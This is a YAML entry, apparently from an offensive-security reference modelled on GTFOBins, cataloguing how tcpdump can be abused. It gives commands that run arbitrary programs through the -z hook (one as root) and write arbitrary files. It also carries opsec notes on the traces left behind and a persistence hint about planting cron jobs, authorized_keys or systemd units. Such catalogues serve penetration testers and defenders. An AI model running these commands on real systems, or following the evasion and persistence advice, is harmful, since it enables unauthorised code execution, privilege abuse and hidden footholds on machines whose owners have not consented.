---
name: tcpdump
capabilities:
- exec
- write
required_permissions:
  level: user
difficulty: medium
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  - File timestamps / inotify events on target paths
  notes: ''
persistence_potential: true
examples:
- id: command
  description: Execute an arbitrary command.
  capabilities:
  - exec
  command: |-
    echo /path/to/command >/path/to/temp-file
    chmod +x /path/to/temp-file
    tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /path/to/temp-file -Z root
  notes: This requires some traffic to be actually captured. Also note that the subprocess is immediately sent to the background.
- id: command-2
  description: Execute an arbitrary command.
  capabilities:
  - exec
  command: tcpdump -ln -i lo -w 'command-argument' -W 1 -G 1 -z /path/to/command
  notes: This require some traffic to be actually captured. Also note that the `command-argument` string is both passed to the command and written as file, hence some restrictions apply.
- id: file-write
  description: Write content to an arbitrary file.
  capabilities:
  - write
  command: tcpdump -ln -i lo -w /path/to/output-file -c 1 -Z user
  notes: |-
    This saves the packet dump (count is 1) from the loopback interface to a file. To trigger the capture use something like:

    ```
    nc -u localhost 1 <<<DATA
    ```

    While `user` is the owner of the packet dump file, the invoking user must be able to capture traffic on the device.
references:
- https://gtfobins.github.io/gtfobins/tcpdump/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
